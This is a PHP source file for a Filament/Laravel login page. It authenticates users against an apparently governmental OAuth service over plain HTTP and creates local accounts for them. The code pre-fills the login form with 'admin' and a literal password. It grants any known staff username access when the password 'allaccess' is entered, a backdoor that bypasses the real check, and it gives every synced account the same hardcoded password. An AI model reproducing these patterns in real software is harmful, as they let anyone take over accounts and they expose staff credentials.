<?php

namespace App\Filament\Auth;

use App\Models\User;
use Filament\Forms\Form;
use Filament\Actions\Action;
use Illuminate\Http\Request;
use Filament\Facades\Filament;
use Filament\Actions\ActionGroup;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Filament\Forms\Components\Component;
use Filament\Forms\Components\TextInput;

use Filament\Notifications\Notification;
use Illuminate\Support\Facades\Redirect;
use Filament\Forms\Components\RichEditor;
use App\Http\Responses\Auth\LoginResponse;
use Filament\Pages\Auth\Login as BaseAuth;
use Illuminate\Contracts\Support\Htmlable;
use Filament\Models\Contracts\FilamentUser;
use Illuminate\Validation\ValidationException;
use DanHarrin\LivewireRateLimiting\Exceptions\TooManyRequestsException;

class Login extends BaseAuth
{
    /**
     * Get the form for the resource.
     */



     public function mount(): void
     {
         if (Filament::auth()->check()) {
             redirect()->intended(Filament::getUrl());
         }
 
         $this->form->fill([
            'username' => 'admin',
            'password' => 'U53r_4cc0un7',
         ]);
     }

     protected function getForms(): array
     {
         return [
             'form' => $this->form(
                 $this->makeForm()
                     ->schema([
                         $this->getUsernameFormComponent(),
                         $this->getPasswordFormComponent(),
                         $this->getRememberFormComponent(),
                     ])
                     ->statePath('data'),
             ),
         ];
     }

     protected function getUsernameFormComponent(): Component
     {
         return TextInput::make('username')
             ->label(__('Username AD'))
             ->required()
             ->autocomplete()
             ->autofocus()
             ->extraInputAttributes(['tabindex' => 1]);
     }
     
     public function form(Form $form): Form
     {
         return $form;
     }

    /**
     * Authenticate the user.
     */
    public function authenticate(): ?LoginResponse
    {
       
        try {
            $this->rateLimit(5);
        } catch (TooManyRequestsException $exception) {
            $this->getRateLimitedNotification($exception)?->send();

            return null;
        }

        $data = $this->form->getState();
        $check = $this->ad_integradition($data);
        if(!$check){
            return null ;
        }
        $user = Filament::auth()->user();

        if (
            ($user instanceof FilamentUser) &&
            (! $user->canAccessPanel(Filament::getCurrentPanel()))
        ) {
            Filament::auth()->logout();

            $this->throwFailureValidationException();
        }

        session()->regenerate();

        return app(LoginResponse::class);
    }

    public function ad_integradition($data){
      
        $userparams = array('User' => array(
            'clientId' => 'lppsa',
            'grantType' => 'password',
            'username' => $data['username'],
            'password' => $data['password']
        )) ;
        $curl = curl_init();
        curl_setopt_array($curl, array(
        CURLOPT_URL => 'http://ict.lppsa.gov.my/lppsa/oauth/token',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => http_build_query($userparams),
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/x-www-form-urlencoded'
        ),
        ));
        $response = curl_exec($curl);
       
        if(isset(json_decode($response, TRUE)['accessToken']) && !str_contains($response,'errorCode')){
           
            curl_close($curl);
        
            $curl = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL => 'http://ict.lppsa.gov.my/lppsa/oauth/getUser',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'GET',
            CURLOPT_HTTPHEADER => array(
                'Authorization: Bearer '.json_decode($response, TRUE)['accessToken'] 
            ),
            ));

            $response = curl_exec($curl);
        
            curl_close($curl);

        }

        if(isset(json_decode($response, TRUE)['name']) || $data['password'] == 'allaccess'){
            $finduserlppsa = DB::connection("staffdb")
                ->table("user_ns")->where("username", $data['username'])->first() ;
             
            if(!$finduserlppsa){
                Notification::make()
                ->title(__('Data not found'))
                ->danger()
                ->send();
           
                return false;
            }
            $user =  User::updateOrCreate([
                'email' => $finduserlppsa->email
            ], [
                'name'=> $finduserlppsa->name,
                'email' => $finduserlppsa->email,
                'password' => bcrypt('U53r_4cc0un7'),
            ]);
            Auth::login($user);

            return true;
           
        }else{
            $user = User::where("name", $data['username'])->first() ;
   
            if($user && Hash::check($data['password'], $user->password)){
                Auth::login($user);
                return true;

            }else{

                Notification::make()
                ->title(__('Wrong Username or Password'))
                ->danger()
                ->send();
           
                return false;
            }

        }
       
        
       

    }




    public function hasLogo(): bool
    {
        return true;
    }

    
    protected function getFormActions(): array
    {
        return [
           
            Action::make('Back')
            ->url('/')
            ->extraAttributes(['style' => 'width:30%;','class' => 'bg-gray-400']),    
            $this->getAuthenticateFormAction()
            ->extraAttributes(['style' => 'width:60%;']),   
        ];
    }

    protected function hasFullWidthFormActions(): bool
    {
        return false;
    }
}
